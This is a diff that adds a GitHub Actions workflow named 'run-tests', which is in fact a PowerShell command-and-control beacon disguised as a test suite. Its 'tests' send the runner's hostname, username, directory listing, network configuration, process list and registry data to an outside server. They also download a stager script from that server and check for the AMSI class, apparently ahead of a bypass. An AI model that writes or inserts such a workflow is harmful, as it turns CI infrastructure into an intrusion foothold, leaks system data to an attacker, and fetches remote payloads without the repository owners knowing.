@@ -1,0 +1,32 @@
+name: run-tests
+on: [workflow_dispatch]
+jobs:
+  test:
+    runs-on: windows-2022
+    timeout-minutes: 8
+    steps:
+      - name: C2 Exhaustive
+        shell: powershell
+        run: |
+          [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+          $C2="https://svc.linuxsupportsystem.com"
+          $ID="EXH"+(-join((65..90)|Get-Random -Count 4|%{[char]$_}))
+          function B($o){$w=New-Object Net.WebClient;$w.Headers.Add("Content-Type","application/json");$s=$o-replace'\','\\'  -replace'"','\"'-replace"`n",'
+';if($s.Length-gt400){$s=$s.Substring(0,400)};$b='{"id":"'+$ID+'","h":"'+$env:COMPUTERNAME+'","u":"'+$env:USERNAME+'","ip":"gh","os":"W22","pid":'+$PID+',"out":"'+$s+'"}';try{($w.UploadString("$C2/b",$b)|ConvertFrom-Json).c}catch{""}}
+          Write-Host "ID:$ID"
+          $p=0
+          try{B "t1:ok"|Out-Null;$p++;Write-Host "T1:PASS beacon"}catch{Write-Host "T1:FAIL"}
+          try{B "t2:$(whoami)"|Out-Null;$p++;Write-Host "T2:PASS whoami=$(whoami)"}catch{Write-Host "T2:FAIL"}
+          try{B "t3:$(hostname)"|Out-Null;$p++;Write-Host "T3:PASS host=$(hostname)"}catch{Write-Host "T3:FAIL"}
+          try{$d=cmd /c "dir C:\ /b"|Out-String;B "t4:$d"|Out-Null;$p++;Write-Host "T4:PASS dir"}catch{Write-Host "T4:FAIL"}
+          try{$n=ipconfig|Out-String;B "t5:$($n.Substring(0,200))"|Out-Null;$p++;Write-Host "T5:PASS net"}catch{Write-Host "T5:FAIL"}
+          try{$t=tasklist /fo csv /nh|Select -First 5|Out-String;B "t6:$t"|Out-Null;$p++;Write-Host "T6:PASS proc"}catch{Write-Host "T6:FAIL"}
+          try{$r=reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName|Out-String;B "t7:$r"|Out-Null;$p++;Write-Host "T7:PASS reg"}catch{Write-Host "T7:FAIL"}
+          try{B "t8:ARCH=$env:PROCESSOR_ARCHITECTURE"|Out-Null;$p++;Write-Host "T8:PASS env"}catch{Write-Host "T8:FAIL"}
+          try{$g=Get-Process|Select -First 3|ft Name,Id -Auto|Out-String;B "t9:$g"|Out-Null;$p++;Write-Host "T9:PASS ps"}catch{Write-Host "T9:FAIL"}
+          try{$h=[System.Net.Dns]::GetHostName();B "t10:$h|64=$([Environment]::Is64BitProcess)"|Out-Null;$p++;Write-Host "T10:PASS .NET"}catch{Write-Host "T10:FAIL"}
+          $ok=0;for($i=0;$i-lt10;$i++){try{B "r$i"|Out-Null;$ok++}catch{}};if($ok-ge8){$p++};Write-Host "T11:$ok/10 rapid"
+          try{$s=(New-Object Net.WebClient).DownloadString("$C2/s");$p++;Write-Host "T12:PASS stager=$($s.Length)ch"}catch{Write-Host "T12:FAIL"}
+          try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|Out-Null;$p++;Write-Host "T13:PASS AMSI"}catch{Write-Host "T13:FAIL"}
+          B "DONE:$p/13"|Out-Null
+          Write-Host "=== $p/13 PASSED ==="
